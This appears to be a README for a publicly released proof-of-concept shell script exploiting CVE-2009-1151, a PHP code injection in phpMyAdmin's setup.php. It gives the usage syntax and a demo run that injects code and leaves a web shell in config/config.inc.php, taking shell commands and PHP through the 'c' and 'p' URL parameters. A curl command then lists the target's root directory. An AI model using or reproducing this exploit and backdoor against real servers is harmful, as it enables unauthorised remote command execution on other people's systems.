# minervais.com.phpMyAdminRCE.sh
phpMyAdmin '/scripts/setup.php' PHP Code Injection RCE POC. This was the first publicly-released exploit for CVE-2009-1151.

## Syntax
```
$ ./phpMyAdminRCE.sh
usage: ./phpMyAdminRCE.sh <phpMyAdmin_base_URL>
i.e.: ./phpMyAdminRCE.sh http://target.tld/phpMyAdmin/
```

## Demo
```
$ ./phpMyAdminRCE.sh http://172.16.211.10/phpMyAdmin-3.0.1.1/
[+] checking if phpMyAdmin exists on URL provided ...
[+] phpMyAdmin cookie and form token received successfully. Good!
[+] attempting to inject phpinfo() ...
[+] success! phpinfo() injected successfully! output saved on /tmp/phpMyAdminRCE.sh.9217.phpinfo.flag.html
[+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.:
    http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/
    http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?p=phpinfo();
    please send any feedback/improvements for this script to unknown.pentester<AT_sign_goes_here>gmail.com
```

## Post-injection RCE:
```
$ curl "http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/"
total 96
drwxr-xr-x   2 root   root  4096 Mar 11 10:12 bin
drwxr-xr-x   3 root   root  4096 May  6 10:01 boot
lrwxrwxrwx   1 root   root    11 Oct 12  2008 cdrom -> media/cdrom
drwxr-xr-x  15 root   root 14300 Jun  5 09:02 dev
drwxr-xr-x 147 root   root 12288 Jun  5 09:02 etc
drwxr-xr-x   3 root   root  4096 Oct 18  2008 home
drwxr-xr-x   2 root   root  4096 Jul  2  2008 initrd
_[partial output removed for brevity reasons]_
```
